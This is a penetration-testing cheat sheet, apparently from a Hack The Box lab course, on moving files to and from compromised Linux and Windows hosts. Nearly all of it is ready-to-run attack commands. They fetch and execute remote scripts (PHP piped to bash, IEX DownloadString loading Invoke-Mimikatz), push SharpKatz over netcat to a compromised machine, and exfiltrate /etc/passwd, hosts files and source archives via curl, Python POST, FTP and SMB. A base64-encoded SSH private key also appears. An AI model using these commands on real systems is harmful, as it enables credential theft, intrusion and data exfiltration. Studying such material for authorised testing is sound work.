# Linux 

---
---


## Base64 Decode & Encode

**Endode**
```BASH
cat id_rsa | base64 -w 0 ; echo
# the -w 0 -> means only one line
# we can check the md5 sum using this command 
md5sum id_rsa
```
**To Decode**
```BASH
echo -n 'xxxxx' | base64 -d > id_rsa
check md5 sum -> md5sum id_rsa
```
---
---







## Download with bash

**Connect to the Target Webserver**

```BASH
exec 3<>/dev/tcp/10.10.10.32/80`
```

**HTTP GET Request**
```BASH
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
```
**Print the Response**
```BASH
cat <&3
```
---
---




## SSH Downloads - scp


**Enabling the SSH Server**
```BASH
sudo systemctl enable ssh
```

**Starting the SSH Server**
```BASH
sudo systemctl start ssh
```
**Checking for SSH Listening Port**

```BASH
netstat -lnpt
```

**Linux - Downloading Files Using SCP**
```BASH
scp plaintext@192.168.49.128:/root/myroot.txt . 
```
---
---



## upload

**using python3**
```BASH
python3 -m http.server
```


**using python2.7**
```BASH
python2.7 -m SimpleHTTPServer
```

**using php**
```BASH
php -S 0.0.0.0:8000
```

**using ruby**
```BASH
ruby -run -ehttpd . -p8000
```

**scp upload**
```BASH
scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
```
---
*** 
# File Download

**wget** 
```BASH
wget https://google.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
**curl**
```BASH
curl -o /tmp/LinEnum.sh https://raw.google.com/rebootuser/LinEnum/master/LinEnum.sh
```

*** 
***
***





# Catching Files Over HTTP(S)

**A good alternative for transferring files to Apache is [Nginx]**

**Create a Directory to Handle Uploaded Files**
```BASH
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```



**Change the Owner to www-data**
```BASH
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

**Create Nginx Configuration File**
```BASH
Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents:`
```

```BASH
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

**Symlink our Site to the sites-enabled Directory**
```BASH
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

**Start Nginx**
```BASH
sudo systemctl restart nginx.service
```

**Verifying Errors**
```BASH
tail -2 /var/log/nginx/error.log
```

**Remove NginxDefault Configuration**
```BASH
sudo rm /etc/nginx/sites-enabled/default
```

**Upload File using cURL**
```BASH
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```



```BASH
There is nothing worse than being on a penetration test,
and a client's network IDS picks up on a sensitive file
being transferred over plaintext and having them ask why
we sent a password to our cloud server without using encryption.
```


***
***
# Miscellaneous File Transfer Methods 

**File Transfer with Netcat and Ncat**

**In this example, we'll transfer [SharpKatz.exe]**
**NetCat**
```BASH
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

**Ncat**
```BASH
ncat -l -p 8000 --recv-only > SharpKatz.exe`
```

**Netcat - Attack Host - Sending File to Compromised machine**
```BASH
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

**Ncat - Attack Host - Sending File to Compromised machine**
```BASH
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

***
***

# Protected File Transfers 

## File Encryption on Linux

#### Encrypting /etc/passwd with openssl
```BASH
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

#### Decrypt passwd.enc with openssl
```BASH
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

***
***

# Transferring Files With Code 


# Download Files


**Python 2**
```BASH
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**Python 3**
```BASH
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```




**PHP -  File_get_contents()**
```BASH
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

**PHP - Fopen()**
```BASH
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

**PHP - File and Pipe it to Bash**
```BASH
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```



**Ruby**
```BASH
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

**Perl**
```BASH
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
---
***
# Upload Files

**Starting the Python uploadserver Module**
```BASH
python3 -m http.server
```

**Uploading a File Using a Python One-liner**
```BASH
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
***
***
***
# Windows

---
---
## PowerShell Base64 Encode & Decode

**PwnBox Check ssh Key MD5 Hash**
```BASH
htb$ md5sum id_rsa
```

**PwnBox Encode SSH Key to Base64**
```BASH
cat id_rsa | base64 -w 0 ; echo
```

**copy the output  and open PowerShell to decode**
```BASH
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```

**Confirming The MD5 Hashes**
```BASH
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
---
***

## PowerShell Web Downloads

**File Download**

**Method - 1**

```BASH
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

**Method - 2**

```BASH
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```
---
***

## PowerShell DownloadString - Fileless Method

**Method - 1** 

```BASH
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
**Method - 2 || IEX** 

```BASH
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
***
---

## PowerShell Invoke-WebRequest

**From PowerShell 3.0 onwards**
**you can use (iwr , curl , wget insted of Invoke-WebRequest )** 
```BASH
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

**To bypass Internet Explorer Errors i will add this option**
```BASH
-UseBasicParsing
```
**The Final  Command will be** 
```BASH
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
***
***
## SMB Downloads

**Using CMD**
**Create the SMB Server**


```BASH
sudo impacket-smbserver share -smb2support /tmp/smbshare
```


**Copy a File from the SMB Server**

```BASH
C:\htb> copy \\192.168.220.133\share\nc.exe
```


**Note : THe New Version Of WIndows Block Unauthenticated Guest Access**
**Create SMB Server WIth A Username And Password**

```BASH
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

**Mount the SMB Server with Username and Password**

```BASH
C:\htb> net use n: \\192.168.220.133\share /user:test test

copy n:\nc.exe
```

***
***

## FTP Downloads

**Installing the FTP Server Python3 Module** 
```BASH
sudo pip3 install pyftpdlib
```

**Setting up a Python3 FTP Server**
```BASH
sudo python3 -m pyftpdlib --port 21
```


**Transfering Files from an FTP Server Using PowerShell**
```BASH
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

**If We Doesn't have an Interactive shell we can use this commands**

```BASH
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```
***
***

## Upload Operations


## PowerShell Base64 Encode & Decode

**Enconding FIle Using PowerShell**
```BASH
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

**Get The Hash Of The File**
```BASH
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```
**Decode Base64 String In Linux**
```BASH
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```

**Check File Hash**
```BASH
$md5sum hosts
```

***
***


## PowerShell Web Uploads


**SMB Uploads**
**Installing WebDav Python Modules**

```BASH
sudo pip install wsgidav cheroot
```

**using The WebDav Python module**
```BASH
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

**Connecting To The Webdav Share**
```BASH
C:\htb> dir \\192.168.49.128\DavWWWRoot
```


**Uploading FIles Using SMB**
```BASH
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\

C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
***
***

## FTP UPloads
```BASH
sudo python3 -m pyftpdlib --port 21 --write
```

**PowerShell Upload File On FTP**
```BASH
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```


## Create a Command File for the FTP Client to Upload a File



```BASH
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
---
---

## File Encryption on Windows

**Import Module Invoke-AESEncryption.ps1**
```BASH
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```

**File Encryption Example**
```BASH
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```
---
---
